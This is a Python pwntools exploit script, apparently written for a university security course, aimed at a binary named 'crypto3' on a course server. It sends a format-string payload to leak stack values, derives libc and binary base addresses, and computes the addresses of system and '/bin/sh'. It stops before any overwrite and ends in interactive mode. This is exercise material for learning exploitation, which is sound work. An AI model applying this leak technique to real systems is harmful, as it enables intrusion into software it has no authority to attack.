#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './crypto3' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 10997 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
def create(bytes):
    p.recvuntil(b"refresh): ", drop=True)
    p.sendline(b'c')
    p.recvuntil(b"255): ", drop=True)
    p.sendline(bytes)

def list():
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'l')

def delete():
    p.recvuntil(b"): ", drop=True)
    p.sendline(b'd')

# Buffer starts at 12th argument of %x

payload = b'aaaa' + b'%x '*0x10
create(payload)
list()
p.recvuntil(b"aaaa", drop=True)
leaks = p.recvline()
p.recvline()
log.info(f"leaks @ {leaks}")
# This is also the GOT??
libc_base = leaks[27:35]
libc_base = int(libc_base, 16)
libc_base = libc_base - 0x1D8000
log.info(f"libc base @ {hex(libc_base)}")
# This is actually the GOT
binary_base = leaks[36:44]
binary_base = int(binary_base, 16)
binary_base = binary_base - 0x4000
log.info(f"binary base @ {hex(binary_base)}")

libc_system = libc_base + 0x03d200
libc_binsh = libc_base + 0x17e0cf

p.interactive()

